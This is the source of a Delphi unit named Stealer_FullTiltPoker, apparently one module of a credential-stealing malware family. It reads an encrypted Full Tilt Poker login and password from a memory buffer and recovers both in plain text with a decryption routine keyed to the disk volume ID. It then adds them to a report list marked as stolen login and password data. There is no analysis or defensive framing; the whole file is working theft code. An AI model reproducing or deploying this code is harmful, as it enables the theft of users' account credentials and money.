unit Stealer_FullTiltPoker;

interface

uses
  Sysutils,Windows,Classes,dialogs;

var
  gsl:tstringlist;

function ProcessShit(hmem:DWORD;dsize:DWORD;placeto:tstringlist): dword;

implementation

uses Parser;

function DecryptPass(const Password: ansiString; volid,t:DWORD): ansiString;
  function GenKey(var magic: Integer): Integer;
  begin
    magic := magic * $343FD + $269EC3;
    Result := (magic shr $10) and $7fff;
  end;
var
  i: integer;
  S: ansiString;
  magic, len: Integer;
begin
  Result := '';

  if Length(Password) < 5 then Exit;

  magic := t;
  t := ((volid shr 16) and $1f) + (Ord(Password[1]) or (Ord(Password[2]) shl 8)) + 1;
  i := 0;

  while t > 0 do begin
    i := GenKey(magic);
    Dec(t);
  end;

  if i <> (Ord(Password[3]) or (Ord(Password[4]) shl 8)) then
    Exit;

  len := Ord(Password[5]);

  S := Password;
  Delete(S, 1, 5);
  if (len <= 0) or (len > Length(S)) then Exit;

  for i := 1 to len do begin
    t := GenKey(magic) xor Ord(S[i]);
    S[i] := AnsiChar(t);
  end;

  S := Copy(S, 1, len);

  Result := S;
end;

function ProcessShit(hmem:DWORD;dsize:DWORD;placeto:tstringlist): dword;
var
  adapters:tstringlist;
  t,volID:DWORD;
  pwd,login,dpwd,dlogin:ansistring;
  pwdsize,loginsize:DWORD;
begin
  gsl:=tstringlist.Create;
  adapters:=tstringlist.Create;
  result:=0;
  if dsize<=0 then exit;
  
  CopyMemory(@pwdsize,pointer(hmem),sizeof(pwdsize));
  inc(hmem,sizeof(pwdsize));
  SetLength(pwd, pwdsize);
  CopyMemory(pointer(pwd),pointer(hmem),pwdsize);
  inc(hmem,pwdsize);

  CopyMemory(@loginsize,pointer(hmem),sizeof(loginsize));
  inc(hmem,sizeof(loginsize));
  SetLength(login, loginsize);
  CopyMemory(pointer(login),pointer(hmem),loginsize);
  inc(hmem,loginsize);

  CopyMemory(@volID,pointer(hmem),sizeof(volID));
  inc(hmem,sizeof(volID));

  CopyMemory(@t,pointer(hmem),sizeof(t));

  dlogin:=DecryptPass(login,volID,t);
  dpwd:=DecryptPass(pwd,volID,t);

  placeto.Add(formattype(REPORT_DATA_LOGIN)+dlogin);
  placeto.Add(formattype(REPORT_DATA_PWD)+dpwd);
  
  adapters.free;
  gsl.Free;
end;

end.
